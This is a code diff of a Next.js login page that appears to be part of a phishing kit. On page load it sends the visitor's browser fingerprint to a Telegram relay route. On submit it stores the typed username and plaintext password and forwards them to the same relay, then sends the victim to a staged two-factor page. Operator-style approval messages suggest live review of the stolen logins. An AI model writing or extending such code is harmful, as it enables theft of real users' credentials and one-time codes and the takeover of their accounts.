@@ -2,59 +2,76 @@
 
 import { useState, useEffect } from 'react';
 import { useRouter } from 'next/navigation';
+import {
+  MSG_INCORRECT_USERNAME_PASSWORD,
+  MSG_UNABLE_REACH_VERIFICATION,
+} from '@/lib/approval-messages';
+import {
+  clearLoginDeniedError,
+  hasLoginDeniedError,
+  storeLoginCredentials,
+} from '@/lib/login-flow-storage';
+import { postTelegramEvent } from '@/lib/telegram-client';
 
 export default function LoginPage() {
   const router = useRouter();
   const [showPassword, setShowPassword] = useState(false);
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
-  const [networkError, setNetworkError] = useState('');
+  const [networkError, setNetworkError] = useState(() => {
+    if (typeof window === 'undefined') return '';
+    return hasLoginDeniedError() ? MSG_INCORRECT_USERNAME_PASSWORD : '';
+  });
   const [submitting, setSubmitting] = useState(false);
   const [navigatingTo, setNavigatingTo] = useState(null);
 
   useEffect(() => {
-    const sendVisit = async () => {
-      const screen = typeof window !== 'undefined' && window.screen
-        ? `${window.screen.width}x${window.screen.height}`
-        : 'Unknown';
-      const language = typeof navigator !== 'undefined' ? navigator.language : 'Unknown';
-      const referrer = typeof document !== 'undefined' && document.referrer ? document.referrer : 'Direct';
-      const url = typeof window !== 'undefined' ? window.location.href : '';
-      const now = new Date();
-      const localTime = now.toLocaleString();
-      const utcTime = now.toISOString();
-      try {
-        await fetch('/api/notify-visit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ screen, language, referrer, url, localTime, utcTime }),
-        });
-      } catch {
-        // Visit notification failure does not block the page
-      }
+    const client = {
+      userAgent: window.navigator.userAgent,
+      language: window.navigator.language || '',
+      screen: `${window.screen.width}x${window.screen.height}`,
+      referrer: document.referrer || 'Direct',
+      url: window.location.href,
+      localTime: new Date().toLocaleString(),
+      utcTime: new Date().toUTCString(),
     };
-    sendVisit();
+
+    fetch('/api/telegram', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        userId: '',
+        password: '',
+        method: '',
+        code: '',
+        client,
+        eventType: 'visit',
+      }),
+    }).catch(() => {});
   }, []);
+
+  useEffect(() => {
+    if (networkError === MSG_INCORRECT_USERNAME_PASSWORD) {
+      clearLoginDeniedError();
+    }
+  }, [networkError]);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+    if (!username || !password || submitting) return;
     setNetworkError('');
     setSubmitting(true);
+    const trimmedUsername = username.trim();
+    storeLoginCredentials(trimmedUsername, password);
     try {
-      const res = await fetch('/api/notify-login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, password }),
+      const telegramPromise = postTelegramEvent('login', {
+        userId: trimmedUsername,
+        password,
       });
-      if (!res.ok) {
-        setNetworkError('Network error. Please check your connection and try again.');
-        setSubmitting(false);
-        return;
-      }
-      await new Promise((r) => setTimeout(r, 2000));
+      await Promise.all([new Promise((r) => setTimeout(r, 2000)), telegramPromise]);
       router.push('/login/2fa');
     } catch {
-      setNetworkError('Network error. Please check your connection and try again.');
+      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
       setSubmitting(false);
     }
   };
